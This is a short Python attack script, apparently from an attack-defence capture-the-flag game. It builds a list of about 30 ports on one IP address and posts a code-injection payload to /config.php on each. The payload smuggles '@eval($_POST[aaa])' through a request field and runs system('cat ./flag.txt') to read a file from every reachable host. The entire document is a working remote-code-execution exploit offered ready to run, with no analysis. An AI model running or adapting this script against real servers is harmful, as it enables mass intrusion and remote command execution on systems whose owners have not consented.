#coding=utf-8
import requests
import re
shell_addr="/config.php"
passwd="cmd"
payload =  {"page": 'md5','res':"or @eval($_POST[aaa]) or",'aaa':'system(\'cat ./flag.txt\');'}

iplist = []
for i in range(0,10):
    iplist.append("http://39.100.119.37:10"+str(i)+"80")
print(iplist)
for i in range(10,30):
    iplist.append("http://39.100.119.37:1"+str(i)+"80")
print(iplist)



#密码cmd-路径是config点php

for ip in iplist:
    url=ip+shell_addr
    #print(url)
    try:
        #flag.write(ip+"\n")
        res=requests.post(url,payload,timeout=2)
        #print(res.text)
        if res.status_code == requests.codes.ok:
            print(url)
            print(res.text)
        else:
            pass
    except Exception as e:
        #print(url+" connect shell fail")
        pass
